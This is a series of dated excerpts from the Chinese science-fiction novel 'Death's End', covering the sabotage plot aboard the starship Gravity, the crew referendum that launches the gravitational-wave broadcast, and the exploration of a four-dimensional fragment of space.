<p>程心摇摇头，“你们走吧。知道他们在哪儿吧？谢谢。”她凝神听着直升机的声音，失明后听觉变得格外灵敏，几乎像第三只眼一样。她听到直升机飞起，在两公里外弗雷斯的房子那里再次降低悬停，几分钟后再次升空，渐渐远去。</p>
<p>程心欣慰地闭上眼睛，其实与睁着一样只有黑暗。现在，她那已经撕裂的心终于在血泊中平静下来，这黑暗竟成为一种保护，因为这黑暗之外是更恐怖的所在，那里正在浮现的某种东西，使寒冷感到冷，使黑暗感到黑。</p>
<p>2016-01-27</p>
<p>周围的骚动剧烈起来，脚步声、冲撞声、枪声、咒骂、惊叫、惨叫、哭号……已经开始吃人了吗？应该不会这么快，程心相信，即使到了三个月后完全断粮之际，大部分人也不会吃人。</p>
<p>所以大部分人将被淘汰。剩下的那五千万人无论仍然是人还是变成其他什么东西都不重要，人类作为一个概念即将消失。</p>
<p>现在，可以用一句话来概括人类历史了：走出非洲，走了七万年，最后走进澳大利亚。人类在澳大利亚又回到了起点，但再次起程已不可能，旅行结束了。有婴儿的哭声，程心很想把那个小生命抱在怀中，她又想起了两年前在联合国大厦前抱过的那个宝宝，软软的，暖暖的，孩子的笑那么甜美。母爱让程心的心碎了，她怕孩子们饿着。</p>
<p>威慑纪元最后十分钟，62年11月28日16:17:34至16:27:58，奥尔特星云外，“万有引力”号和“蓝色空间”号</p>
<p>2016-01-28</p>
<p>“你是一个潜伏者，任务是监控引力波发射台，一旦出现战舰高层指挥系统无法控制的危险，就销毁发射控制器。遇到非常情况时，你可以采取自己认为合适的一切手段。”</p>
<p>2016-01-28</p>
<p>万有引力”号的引力波发射系统包括天线和发射控制器，天线就是船体本身，不可能破坏，但只要销毁发射控制器，整个系统就失效了。按照“万有引力”号和“蓝色空间”号上的条件，是不可能重新装配一台新的发射控制器的。</p>
<p>2016-01-28</p>
<p>亨特知道，像自己这样的潜伏者，在古代的核潜艇中也有过。当时不论是在苏联还是北约的战略核潜艇中，都有一些身处不起眼岗位上的士兵和低级军官肩负着这样的使命，随时准备在有人试图控制潜艇和洲际导弹的发射权时，从他们意想不到的方向采取果断行动制止阴谋。</p>
<p>2016-01-28</p>
<p>你只需活到七十多岁，那时，船体中简并态振动弦的半衰期就到了，‘万有引力’号的引力波发射系统将会失效，于是你的使命也就完成了。算下来，你只需要在前半个航程保持苏醒状态，整个返航航程都可以冬眠。不过，这仍是一个极富献身精神的使命，几乎需要献出一生，你完全可以拒绝。”</p>
<p>“我接受。”</p>
<p>2016-01-28</p>
<p>总参谋长问了一个在过去时代的将领不会提出的问题：“为什么？”</p>
<p>“末日战役中，我曾是战略情报局驻‘牛顿’号的情报分析军官，在战舰被水滴击毁前，我乘一艘救生艇逃生。那是舰上最小的一种救生艇，但上面也能坐五个人，当时有一群人向这边移动，可我单独一个人就把它开走了……”</p>
<p>2016-01-28</p>
<p>这件事我知道，军事法庭已经有结论，你没有过失，你的救生艇开出后不到十秒钟飞船就爆炸了，你没有时间等其他人。”</p>
<p>“是，但……我现在感觉当时还是和‘牛顿’号在一起的好。”“是啊，失败铭心刻骨，我们都觉得自己本不该活下来。不过这一次，你有可能救几十亿人。”</p>
<p>2016-01-28</p>
<p>在交代具体的任务细节前，我首先要你明白一点：任务中行动的触发应该是极其敏感的，在无法判定危险的程度时，你首先应该选择销毁操作，即使误操作也不是你的责任。在操作中，不必考虑附带损失，如果需要，毁灭全舰也是可以接受的。”</p>
<p>2016-01-28</p>
<p>追击“蓝色空间”号是三体和地球两个世界间唯一真正有着共同目标的事业，因为这艘航向太空深处的孤船是两个世界共同的威胁。在诱使黑暗战役幸存的两舰返航的过程中，“蓝色空间”号知晓了宇宙的黑暗森林状态，如果有朝一日他们掌握了宇宙广播的能力，后果不堪设想。对“蓝色空间”号的追击得到了三体世界的全力配合，在进入智子盲区前，“万有引力”号上一直可以收到智子发来的追击目标内部的实时图像。</p>
<p>2016-01-28</p>
<p>在几十年的时间里，亨特先是由中士升为上士，后来又破格提拔为军官，先后由准尉升至上尉，但即使到最后，他也没有权限看到智子传来的“蓝色空间”号内部的影像。然而他掌握着舰上几乎所有系统的后门指令，常常在自己的舱室中把来自“蓝色空间”号的图像缩至巴掌大小观看</p>
<p>2016-01-28</p>
<p>现在，亨特的使命已接近完成。监测系统显示，引力波发射天线的主体，那根不到十纳米粗、却贯穿一千五百米舰体的简并态振动弦即将到达它的半衰期，再有不到两个月的时间，振动弦的密度将降低到正常发射引力波的底线之下，天线将完全失效。到时，“万有引力”号不再是对两个世界都具有致命威胁的引力波广播台，将变成一艘普通的星际飞船，亨特的任务也就完成了。那时，他将表明自己的身份——他很好奇自己面对的是敬佩还是谴责，不管怎样，他将停止服用那种蓝药片，脑血管凝血障碍将消失，他会进入冬眠，醒来后在地球上的新纪元度过自己的余生。不过冬眠要在见到玲子之后，反正也快了。</p>
<p>2016-01-28</p>
<p>相对于天线的巨大，引力波发射系统的控制单元体积却很小——处于舰尾一个很小的球形舱中，系统完全独立，与舰上的其他部分没有任何联系。那个球形舱像一只被加固的保险箱，包括舰长在内，舰上没人拥有进入的密码，只有地球上的执剑人才能启动系统发射。如果执剑人在地球上启动引力波广播，就会有一束中微子信息发向“万有引力”号，也启动飞船上的广播发射，当然，现在这个信号从地球到达这里需要一年时间。</p>
<p>2016-01-28</p>
<p>但“万有引力”号一旦被劫持，这些防护措施并不能起太大作用。</p>
<p>亨特的手表上有一个小按钮，按下后，将触发发射控制单元所在的球形舱里的一枚烧熔弹，能够高温熔化舱内的一切设备。他要做的就是以不变应万变，不管出现什么样的危机，只要其危险超出阈值，就按动那个小按钮毁掉发射控制单元，也就使引力波广播系统处于不可恢复的失效状态；事态是否超过危险阈值，由他自己来判断。</p>
<p>2016-01-28</p>
<p>从这个意义上看，亨特其实是一名“反执剑人”。</p>
<p>2016-01-28</p>
<p>刚才，亨特又来到观测站，在来路上遇到关一帆和那个心理学家前往舰首，于是他决定直接到控制单元舱去看看。就在距那里不到十米时，水滴攻击的警报出现了。由于他的级别所限，在面前出现的信息窗口只显示了很粗略的内容，但他知道，水滴此时距飞船比编队航行时远许多，可能还有十几秒的时间。在这最后的短暂时间里，老亨特感到的只有解脱和欣慰，不管以后的世界会怎样，他终于完成了使命，等待他的不是死亡，是自己的胜利。</p>
<p>正因为如此，当半分钟后警报解除时，亨特反而成了全舰唯一一个陷入极度恐惧的人。对于他的使命而言，水滴攻击是一个解脱，但警报的解除则隐含着巨大的危险，因为这意味着在已经出现的莫测局势中，引力波发射系统将保持完好。毫不犹豫地，他按动了手表上的销毁按钮。一片寂静，虽然控制单元舱密封很严，但应该能感觉到内部烧熔弹爆炸的震动，手表的小屏幕上显示：销毁操作无法完成，销毁模块已被拆除。</p>
<p>2016-01-28</p>
<p>警报解除三分钟后，“万有引力”号的舰长约瑟夫·莫沃维奇才来得及和高层指挥官们聚集到作战中心。中心显示着巨大的模拟态势图，漆黑的太空背景上隐去了所有的星星，只标示出两舰的相对位置和水滴的攻击路线。那两条长三十万千米的白线看上去都是直线，但数据显示两条长线其实都是抛物曲线，只是曲率太小看不出来。两个水滴开始加速后不久，它们的航向就在不断地改变，这种改变十分微小，但累积起来最终造成了它们对各自攻击目标的几十米误差。指挥官们都认识到，这根本不是水滴的航线。他们中的许多人都参加过末日战役，水滴在超高速运动中凌厉的锐角转向至今想起仍令他们胆战心惊；而现在这条航线，看上去像是有一个与航线垂直的外力连续地作用于水滴，把它从攻击航线上推开。</p>
<p>2016-01-28</p>
<p>接着放高速摄影，十几秒钟的过程全放完需要很长时间，只选择最后一段，大家看到了从摄影镜头前方掠过的水滴，在群星背景前像一颗黯淡的流星一闪而过。然后影像重放，当水滴运动至画面正中时定格，然后逐级放大，直至水滴占据了大半个画面。半个世纪的编队航行令他们对水滴十分熟悉，也使得眼前的情景更令他们震惊：画面中的水滴形状依旧，但表面不再是绝对光滑的镜面，而是呈现晦暗的黄铜色，看上去好像锈迹斑斑，仿佛一个巫师维持青春的巫术突然失效，三个世纪的太空岁月留下的痕迹一下子全部显现出来，它不再是一个亮晶晶的精灵，变成了一枚飘浮在太空中的旧炮弹。近年来，与地球的通信使他们了解了强互作用力材料的一些基本原理，知道水滴的表面处于一种由内部装置产生的力场中，这种力场能够抵消粒子间的电磁力，使强互作用力溢出，如果力场消失，强互作用力材料就变成了一块普通的金属。</p>
<p>水滴死了。</p>
<p>2016-01-28</p>
<p>接下来显示后面的监测记录。模拟图显示，水滴擦过“万有引力”号后，航向停止缓慢的改变，变成了直线匀速滑行，那个神秘的外加推力消失了。这种状态只持续了几秒钟，接着水滴开始减速，战场分析系统的计算显示，使水滴减速的推力与刚才改变它航向的推力大小相等，似乎是同一个推力源由垂直于航向转移到了水滴的正前方。</p>
<p>2016-01-28</p>
<p>在高倍望远镜拍摄的可见光影像中，可以看到正在远去的水滴的背面，接着，水滴自身倒转了九十度，以与航向垂直的状态开始减速。就在这时，一幕神话般的情景出现了——现在韦斯特医生也在场，如果不是他亲眼所见，肯定又一口咬定这是心理幻觉——水滴前方出现了一个三角形的物体，长度大约是它的两倍，大家一眼就认出那是“蓝色空间”号上的太空穿梭机！为了增加推力，穿梭机上外挂了多台小型聚变发动机，虽然发动机的喷口都背对着画面，但仍可以看到它们全力开动喷出的光柱。穿梭机紧顶着水滴使它减速，可以推测刚才使水滴航向改变从而拯救“万有引力”号的推力也是同一来源。在穿梭机出现后，水滴的另一侧又出现了两个穿宇宙服的身影，减速产生的过载使那两人的身体紧贴在水滴上，其中一人的手中拿着一个什么仪器，似乎在对捕获品进行研究。以前，在人们的印象中，水滴是一种具有神性的东西，似乎不属于这个世界，也是人不可能接近的，末日战役前，唯一一次与水滴进行零距离接触的人都已灰飞烟灭。但在眼前的接触中，水滴已经神性全无，失去镜面后它看上去平淡无奇，显得比旁边的太空穿梭机和宇航员都陈旧，全无灵气，像是后者收集的一个古董或废品。穿梭机和宇航员只出现了几秒钟就消失了，已经死去的水滴再次孤零零地飘浮在太空中，但仍在减速，说明穿梭机还在那里推着它，只是隐形了。</p>
<p>“他们能摧毁水滴？！”有人惊叫。莫沃维奇舰长的第一反应只想到一件事，同警报解除时的亨特一样，他没有片刻犹豫，按动自己手表上的一个按钮，那是与亨特那只一样的手表，这一次，错误信息显示在空中跳出的一个红色信息窗口中：</p>
<p>销毁操作无法完成，销毁模块已被拆除。</p>
<p>2016-01-28</p>
<p>“马上做手术也许还能救活他。”朴义君少校用沙哑的声音吃力地说，他胸前的两个弹洞仍在冒血，“现在医生不需要开胸就能把心脏接回去……其他的人不要乱动，否则，他们摘除你们的心脏或大脑就像从眼前的树枝上摘个苹果一样容易。‘万有引力’号已经被占领了。”</p>
<p>2016-01-28</p>
<p>现在已经没有什么是不可置信的，“蓝色空间”号已经变成一艘超自然的魔法战舰，“万有引力”号上的人们在重温末日战役中的震撼。</p>
<p>2016-01-28</p>
<p>在“蓝色空间”号的球形大厅中央悬浮着一千四百多人，他们大部分是“蓝色空间”号上的人员，有一千二百多人。六十多年前，也是在这里，“蓝色空间”号上的官兵列队宣誓接受章北海的指挥，现在他们基本上还是那些人。由于飞船上常规航行时苏醒状态的值勤人数很少，所以六十多年后他们的平均年龄只老去三到五岁，大部分人并没有感到时光的流逝，黑暗战役的烈焰和太空中冷寂的葬礼都历历在目。其余是来自“万有引力”号的一百多人。除了军装的颜色明显不同外，两舰的人员分别聚成了一大一小两个人群，他们互存戒心，拉开了很大的距离。</p>
<p>2016-01-28</p>
<p>两群人之前，两舰的高级指挥官倒是混聚在一起，他们中最引人注目的是“蓝色空间”号的舰长褚岩上校，他四十三岁，看上去还要年轻些，是一位学者型的军人，风度儒雅，言行举止沉稳中甚至带着一丝羞涩。但在地球世界，褚岩已是一个传奇人物。黑暗战役中，是他命令提前抽空了“蓝色空间”号内部的空气，在次声波核弹的最初攻击中免于覆灭，以至于在地球的舆论中，“蓝色空间”号在黑暗战役中是属于自卫还是谋杀仍有争议。黑暗森林威慑建立后，也是他力排众议，顶着全舰思乡心切的巨大压力，没有全速回航地球，使得在接到“青铜时代”号的警报后有足够的时间逃离。关于褚岩还有许多传说，比如当初“自然选择”号叛逃时，他是唯一一名主动要求出航追击的舰长，有证据表明这是别有用心，他的真实目的是想劫持“蓝色空间”号与“自然选择”号一起叛逃，但这也只是传说。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>褚岩是三体中神级人物之一</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>空中出现一个巨大的全息显示窗口，显示着太空中一片星光稀疏的区域，画面正中有一片淡淡的白雾，雾中有一组刷子样的白色直线，由几百条平行线段组成，这些线段显然经过图像处理的加强，在画面中很醒目。两个多世纪以来，“雾中刷子”图案已为人们所熟悉，甚至被用来做商标。</p>
<p>2016-01-28</p>
<p>“这是三体星系附近星际尘埃中的航迹，是我们在八天前观察到的。请各位注意看。”</p>
<p>人们都盯着图像看，很快发现那些白线都有肉眼可以觉察的延伸。“这是多少倍快放？”“万有引力”号的一名军官问。</p>
<p>“没有快放，是原速。”这话引发了人群中的一阵骚动，像初降的暴雨落入树丛一般。</p>
<p>“粗算一下，这……接近光速了。”“万有引力”号莫沃维奇舰长说，声音倒是很平静，这两天令人难以置信的事情太多了。“是的，第二支三体舰队正在以光速驶向地球，将在四年后到达。”褚岩说，他用关切的目光看着“万有引力”号的人群，似乎对把这个信息告诉他们感到很不安，“你们起航后，地球世界一天天陷入大同盛世的梦幻中不能自拔，完全误判了形势。三体世界一直在等待，现在他们终于等到了机会。”</p>
<p>“谁能证明这不是伪造的？！”“万有引力”号的人群中有人喊。“我证明！”关一帆说，他在前面和军官们站在一起，是他们中唯一一个没穿军装的人，“我的观测站也观测到了同样的航迹，只是我主要进行大尺度的宇宙学观测，没有注意，经他们提醒我才把与此有关的观测数据调出来看了。我们和三体星系、太阳系构成了一个不等边的三角形，三体星系与太阳系是最长的一条边，我们与太阳系是最短的边，我们与三体星系连线的长度介于两者之间，就是说，我们与三体星系的距离比太阳系要近一些，地球大约将在四十天后观察到航迹。”</p>
<p>2016-01-28</p>
<p>禇岩说：“我们相信，在地球那边事变已经发生，具体时间就是五小时前水滴对我们两舰发动袭击的时间。根据从‘万有引力’号上得到的信息，那正是地球上两任执剑人之间刚刚完成交接的时间，这就是三体世界等待了半个世纪的机会。两个水滴显然在进入盲区之前就接到了指令，这是一个策划已久的整体计划。现在可以肯定，黑暗森林威慑状态已不复存在，可能的结果有两个：引力波宇宙广播已经启动，或者没有启动。我们相信——”</p>
<p>禇岩说着，在空中又调出了程心的照片，这是刚从“万有引力”号上得到的。画面上的程心在联合国大厦前抱着婴儿，这个画面放得与航迹的画面一样大，两者形成了鲜明的对比。太空的基色是肃杀的黑色和银色，分别来自空间的深渊和冰冷的星光；而程心真的像一个美丽的东方圣母，她与怀中的婴儿沐浴在柔和的金色阳光中，让人们又找回已久违半个世纪的离太阳很近时的感觉。</p>
<p>2016-01-28</p>
<p>“——我们相信是后者。”禇岩接着说。</p>
<p>“他们怎么选了这样一个执剑人？！”“蓝色空间”号的人群中有人问。莫沃维奇舰长说：“‘万有引力’号起航已经六十多年，我们也飞了有半个世纪了，地球社会的一切都在变化，威慑是个舒服的摇篮，人类躺在里面，由大人变成了孩子。”</p>
<p>“你们不知道地球上已经没男人了吗？”“万有引力”号的人群中有人喊道。“地球人类确实已经没有能力维持黑暗森林威慑。”禇岩说，“按照计划，我们将占领‘万有引力’号重建威慑，但刚刚知道了引力波天线衰变这回事，我们发射引力波的能力只能再维持两个月。请相信，这对我们所有的人都是极大的打击，现在只剩一个选择：立刻启动引力波宇宙广播。”</p>
<p>2016-01-28</p>
<p>人群大乱。在显示着三体舰队光速航迹的冷酷太空旁，怀抱婴儿的程心充满爱意地看着他们。这两幅对比鲜明的巨大画面，彰显着他们面临的两种选择。</p>
<p>2016-01-28</p>
<p>“你们要犯世界灭绝罪？！”莫沃维奇舰长质问道。</p>
<p>面对混乱，禇岩仍保持着平静，他没有理会莫沃维奇舰长，径自对人群说：“启动广播对我们没有任何意义。现在，不论是地球的追捕，还是三体的追杀，我们都逃脱了，两个世界对我们都不再有威胁了。”这是所有人都明白的一件事。隐伏在两舰上的智子进入盲区后不可恢复，它们与三体世界的联系永远中断，水滴也被摧毁，这样，两个世界就丢失了对两舰的跟踪。在奥尔特星云之外的茫茫太空中，即使以三体达到光速的技术力量，重新搜索到两艘灰尘般的飞船也是不可能的。</p>
<p>“你们这是报复！”“万有引力”号的一名军官说。“我们有权报复三体世界，他们应该为已经犯下的罪行负责。这是战争，消灭敌人天经地义。对于人类世界，按照上面的推论，现在他们所有的引力波发射装置都已被摧毁，地球已被控制，很可能，对人类的整体灭绝已经开始。启动宇宙广播是给地球一个最后的机会，太阳系的坐标暴露后，那里再没有任何占领的价值，毁灭随时可能降临，借此就能把太阳系的三体力量赶走；他们的光速舰队也不会再把太阳系作为目标，这就使人类至少避开了迫在眉睫的灭绝。另外，我们的引力波广播只公布三体星系的坐标。”</p>
<p>“这也等于公布了太阳系的坐标。”“是的，但希望能给地球更多的时间，让尽可能多的人类逃离太阳系，至于他们到底逃不逃，那是他们自己的事。”</p>
<p>2016-01-28</p>
<p>“这毕竟是灭绝两个世界的行为，其中一个还是我们的母星，这个决定就像最后审判日的判决一样重大，是不能这么轻易做出的！”莫沃维奇说。</p>
<p>“同意。”禇岩说完，在空中已经出现的两个显示窗口之间又出现了一个全息窗口，显示的图形极为简洁，只有一个长方形的红色按钮，长度有一米左右，下方有一个数字，目前显示为0。</p>
<p>“我说过，我们是一个完整的世界，这个世界中的所有人都是普通人，但命运把我们推到了对两个世界做出最后审判的位置上。最后的决定必须做出，但不能由某个人或某些人做出，这将是这个世界的决定，我们举行全民公决。现在，赞同对三体星系的坐标进行引力波宇宙广播的人，请按动这个红色按钮；反对或弃权的什么都不要做。各位，目前‘蓝色空间’号和‘万有引力’号上的人员总数，包括在场的和正在值勤岗位的，共1415人，如果赞成人数达到或超过总人数的三分之二，即944人，宇宙广播将立刻启动；否则，将直到天线失效，永不启动。下面，全民公决开始。”禇岩说完，转身按动了悬浮在空中的硕大的红色按钮，按钮闪了一下红光，表示点击生效，下面的数字由“0”变为“1”。紧接着，“蓝色空间”号的两位副舰长也先后按动按钮，统计数字跳到“3”；接下来是“蓝色空间”号上的其他高层军官，然后是人群中的中下层军官和士兵，他们以一列细长的队列飘过红色按钮，一次次按动它。</p>
<p>随着按钮的红光一次次闪起，下面的统计数字在不断增长，这是历史心脏的最后跳动，是踏向一切的终点的最后步伐，令所有的人惊心动魄。数字跳到“795”时，关一帆按动了按钮，他是“万有引力”号上投赞成票的第一个人。之后，又有几名“万有引力”号的军官和士兵按动按钮。</p>
<p>终于，数字跳到了“944”，一行醒目的大字浮现在按钮上方：再次点击，引力波宇宙广播将启动。</p>
<p>这时正好轮到队列中的一名士兵，排在他后面的还有很多人。他把手放到按钮上，但没有按动，等着后面的一名少尉把手放到他的手上，接着又有许多双手放上来，叠成高高的一摞。“请等一下。”莫沃维奇舰长突然说，他飘过来，在众目睽睽之下把手放在那摞手的最上方。</p>
<p>然后，这几十只手一起按下，按钮闪起了最后的红光。</p>
<p>2016-01-28</p>
<p>这时，距叶文洁在公元20世纪的那个清晨按下那个红色按钮已经三百一十五年了。</p>
<p>引力波发射启动了。所有人都感到了一阵强劲的振动，这振动似乎不是来自外部，而是自己的身体发出的，似乎每个人都变成了一根嗡嗡作响的琴弦。这死亡之琴只弹奏了十二秒就停止了，然后一切陷入寂静。在飞船外面，时空的薄膜在引力波中泛起一片涟漪，像风吹皱了暗夜中的湖面，对两个世界的死亡判决以光速传向整个宇宙。</p>
<p>威慑后第一年，移民完成后第六天清晨，澳大利亚</p>
<p>2016-01-28</p>
<p>程心被声浪扰乱的听觉渐渐又恢复了敏感，她注意到了另一个微弱的声音，那是自己面前的脚步声，她感觉有人在面前看着她。果然，那人说话了：</p>
<p>“程心博士，你眼睛怎么了，看不见了吗？”程心感到一股微弱的气流，可能是那人在她眼前晃手，“是市长派我来找你的，我们要回家了。”“我没有家。”程心无力地说。家这个词像一把刀子割在她的心上，使她那已在极度的痛苦中麻木的心又抽搐了一下。她想起了三个世纪前离家时那个冬夜，想起了她在家的窗外迎来的那个黎明……父母都在大低谷前去世，他们绝对想象不到女儿已被时光和命运抛到什么样的地方。</p>
<p>2016-01-28</p>
<p>“三体星系的位置暴露了，当然太阳系也暴露了。三体人要跑了！他们的第二支舰队已经转向，离开太阳系了，所有的水滴也都从地球撤走了。用智子刚才的话说：太阳系再也不用担心入侵，这里和三体星系一样，已经成了全宇宙都避之不及的死亡之地。”</p>
<p>怎么可能？！</p>
<p>威慑后第一天至第五天，奥尔特星云外</p>
<p>2016-01-28</p>
<p>有过亲身经历的人都一致同意，置身四维空间的感觉是不可能用语言来描述的，他们甚至断言，四维感觉是人类迄今为止所遇到的唯一一种绝对不可能用语言描述的事物。</p>
<p>人们总是喜欢用这样一个类比：想象生活在三维空间中的一张二维平面画中的扁片人，不管这幅画多么丰富多彩，其中的二维人只能看到周围世界的侧面，在他们眼中，周围的人和事物都是一些长短不一的线段而已。只有当一个二维扁片人从画中飘出来，进入三维空间，再回头看那幅画，才能看到画的全貌。</p>
<p>2016-01-28</p>
<p>他会这样描述：任何东西都不可能挡住它后面的东西，任何封闭体的内部也都是能看到的。这只是一个简单的规则，但如果世界真按这个规则呈现，在视觉上是极其震撼的。当所有的遮挡和封闭都不存在，一切都暴露在外时，目击者首先面对的是相当于三维世界中亿万倍的信息量，对于涌进视觉的海量信息，大脑一时无法把握。</p>
<p>2016-01-28</p>
<p>当然，透视原理仍然起作用，太远就看不清楚，但一切都能看到。没有这种经历的人在听他们描述时会产生一个错误的印象，感觉他们是“透过”舰体看到所有的一切，事实是他们没有“透过”什么，一切的一切都并列在外，就像我们看一张纸上画的圆圈，能看到圆圈内部，并没有“透过”什么。这种展开是所有层次上的，最难以描述的是固体的展开，竟然能够看到固体的内部</p>
<p>2016-01-28</p>
<p>他们被视觉信息的海洋淹没了，仿佛整个宇宙的所有细节全聚集在周围色彩斑斓地并列呈现出来。</p>
<p>2016-01-28</p>
<p>这时，他们不得不面对一个全新的视觉现象：无限细节。在三维世界里，人类的视觉面对的是有限细节，一个环境或事物不管多么复杂，呈现的细节是有限的，只要用足够的时间依次观看，总能把绝大部分细节尽收眼底。但从四维看三维时，由于三维事物在各个层次上都暴露在四维视野中，原来封闭和被遮挡的一切都平行并列出来。比如一个封闭容器，首先可以看到它内部的物体，而这些内部物体的内部也是可见的，在这无穷层次的暴露并列中，便显露出无限的细节</p>
<p>2016-01-28</p>
<p>莫沃维奇和关一帆面前的飞船，虽然一切都显露在眼前，但任何一个小范围内的一件小东西，比如一只水杯或一支笔，它们并列出来的细节也是无限的，视觉也接收到无限的信息，用眼睛看时，穷尽一生也不可能看全它们在四维空间的外形。当一个物体在所有层次上都暴露在四维时，便产生了一种令人眩晕的深度感，像一个无限嵌套的俄罗斯套娃，这时，“从果核中看到无穷”不再是一个比喻。</p>
<p>2016-01-28</p>
<p>你们注意手不要乱动，要是不小心，可能会触到别人或自己的内脏。”禇岩说，“不过只要不用力也问题不大，可能有点儿疼或恶心，有时还会造成轻微的感染。也别乱动周围的东西，除非你确实知道那是什么。现在飞船上的一切都是裸露的，你可能触到高压电缆或高温蒸汽什么的，还可能接触到集成电路，造成系统故障。总之，对于三维世界来说你们现在有神一样的力量，但必须经过一段时间对四维的适应才能使用这种力量。”</p>
<p>莫沃维奇和关一帆很快知道了怎样不触动内脏。从一个方向上，他们可以像在三维世界里一样握住别人的手而不是抓住里面的骨头；要触到骨头或内脏，则需从另一个方向，那是一个在三维空间中不存在的方向。</p>
<p>2016-01-28</p>
<p>接下来，莫沃维奇和关一帆又发现了一件令他们激动的事情：他们能看到星空，在各个方向上都能看到。他们清楚地看见，在宇宙的永恒之夜中，银河系在灿烂地延伸着。他们知道自己此时仍身处飞船中，三人都没有穿宇宙服，都在呼吸着飞船中的空气，但在第四个维度上，他们暴露在太空中。作为宇航员，三个人都曾经历过无数次太空行走，但从未感觉到自己在太空中暴露得这样彻底。以往太空行走时，他们至少包裹在宇宙服中，而现在，没有任何东西挡在他们和宇宙之间，周围这展现出无限细节的飞船对星空没有丝毫遮挡，在第四维度上，整个宇宙与飞船也是并列的。</p>
<p>2016-01-28</p>
<p>对于由无限细节产生的无限信息，生来就是用于感觉和思考三维空间的大脑无法把握，最初都处于信息超载的堵塞状态。但大脑会很快适应四维环境，无意识地忽略掉大部分细节，只把握事物的大框架</p>
<p>2016-01-28</p>
<p>最初的眩晕过去后，莫沃维奇和关一帆又面临着一个更大的震撼，这个感觉刚才被周围环境的无限细节所转移——即对空间本身的感觉，或者说是对三维之外的第四个维度的感觉，后来人们称之为高维空间感。对于亲历过四维空间的人来说，高维空间感是最难用语言描述的，他们往往试图这样说明：我们在三维空间中称之为广阔、浩渺的这类东西，会在第四个维度上被无限重复，在那个三维世界中不存在的方向上被无限复制。他们常常用两面相对的镜子来类比：这时在任何一面镜子中都可以看到被复制的无数面镜子，一个向深处无限延伸的镜子长廊，如果作为类比，长廊中的每面镜子就都是一个三维空间。或者说：人们在三维世界中看到的广阔浩渺，其实只是真正的广阔浩渺的一个横断面。描述高维空间感的难处在于，置身于四维空间中的人们看到的空间也是均匀和空无一物的，但有一种难以言表的纵深感，这种纵深不能用距离来描述，它包含在空间的每一个点中。关一帆后来的一句话成为经典：</p>
<p>“方寸之间，深不见底啊。”感受高维空间感是一场灵魂的洗礼，在那一刻，像自由、开放、深远、无限这类概念突然都有了全新的含义。</p>
<p>2016-01-28</p>
<p>“这一切到底是怎么回事？”莫沃维奇扯开衣领喘息着问。</p>
<p>2016-01-28</p>
<p>“我们进入了一个太空区域，这个区域中的空间维度是四。就这么简单，我们把这个区域叫宇宙中的四维碎块。”</p>
<p>2016-01-28</p>
<p>是不是这样一个模型——”关一帆激动地说，“我们的三维宇宙就是一大张薄纸，一张一百六十亿光年宽的薄纸，这张纸上的某处粘着一个小小的四维肥皂泡？</p>
<p>2016-01-28</p>
<p>从三维空间看不到四维，但从四维空间能够看到三维世界的一切并且能对它产生作用。我们就是在四维的高度伏击了水滴。不管强互作用力探测器有多强大，它仍然是一个三维物体。现在看来，三维本身就意味着脆弱，从四维看去，它不过是一张展开的图纸而已，毫无防御能力，可以从四维接近它，不需要知道它的原理，只需在它的内部，哦，对四维来说全是外部，随意破坏就行。”</p>
<p>2016-01-28</p>
<p>“三体世界也不知道四维碎块的事？”</p>
<p>“现在看来，应该不知道。”</p>
<p>2016-01-28</p>
<p>“肥皂泡——这个四维碎块有多大？”</p>
<p>“在三维空间谈四维的大小没有意义，我们只能说碎块在三维的投影有多大。只进行了初步探测，我们猜测碎块的三维投影是球形的，如果这样，按目前探测的数据计算，它的半径可能在四十至五十个天文单位之间。”“与太阳系的大小差不多。”</p>
<p>2016-01-28</p>
<p>三维空间中，这片太空区域十分空旷，看上去没有什么异常。探测研究主要在四维空间进行。在四维释放探测器有很大的难度，大部分探测研究主要是通过天文望远镜，把望远镜通过翘曲点送入四维，对周围太空进行观察。在四维空间操纵三维仪器需要一段时间的适应，当观测正常进行时，立刻有了震撼的发现。</p>
<p>2016-01-28</p>
<p>望远镜发现了一个圆环状的物体，由于无法确定它与飞船的距离，也就无法测量其体积，估计其三维直径在八十至一百千米左右，环箍直径约二十千米，像一只太空魔戒。环箍上可以看到电路状的复杂结构。从外形上看，基本可以确定这个物体是智慧体制造的。</p>
<p>这是人类第一次直接观察到两个世界之外的第三方宇宙文明。一个最令人震惊的事实是：“魔戒”是封闭的！它处于四维空间中，却没有呈现三维展开，它的内部完全不可见，这就意味着它是一个四维物体！进入四维空间后，这是人们第一次见到四维实体。</p>
<p>人们首先感到的是可能被攻击的恐惧，但“魔戒”表面没有任何活动的迹象，也没有探测到它发出的电磁波、中微子和引力波信号。“魔戒”除了缓慢的自转外，没有任何加速迹象。初步判断这可能是一个废墟，被废弃已久的太空城或宇宙飞船。在接下来的观测中，在四维碎片的深处发现了更多的不明物体，它们大小不一，形状各异，但都带有明显的智慧制造特征。有金字塔形、十字形、多边体框架结构等，还有各种不规则的组合体，但明显不是自然天体。望远镜能够分辨出形状的这类物体已经有十几个，在更远处还有大量的只能看出点状的物体，总计有上百个。同“魔戒”一样，它们没有任何活动迹象，也没有发出任何可检测的信号；还有一个共同点：它们都是封闭的四维实体。</p>
<p>2016-01-28</p>
<p>关一帆向禇岩舰长提出，要驾驶一艘太空艇近距离考察“魔戒”，有可能的话就进入它的内部。这个要求被坚决拒绝了。在四维空间航行充满危险，确定位置需要四个坐标，而来自三维世界的设备或目测只能确定三个坐标，这样，对于三维航行者来说，四维空间中任何一个物体的位置都是不确定的，无论是使用仪器或目测，探险者都无法确定“魔戒”的方位和距离，有可能突然撞上它。同时，在四维太空中寻找返回的翘曲点比较困难。由于有一个维度坐标无法确定，如果发现翘曲点，只能得知它所在的方向，却无法确定距离，有时翘曲点可能距太空艇很远，通过它返回三维时空后，也会落到距飞船十分遥远的地方。另外，太空艇与飞船间通信的电波有相当大的部分溢散到第四个维度，导致信号很微弱，两者间联系很困难</p>
<p>2016-01-28</p>
<p>随着向四维碎块内部的深入，微陨石的密度明显增大，同时还观测到肉眼可见的大陨石从飞船附近掠过，它们与飞船的相对速度是第三宇宙速度的几倍。在三维太空中，飞船的关键部位都层层保护，可以抵挡这些陨石的撞击，但现在，它们完全暴露在四维中，没有任何防护能力。</p>
<p>2016-01-28</p>
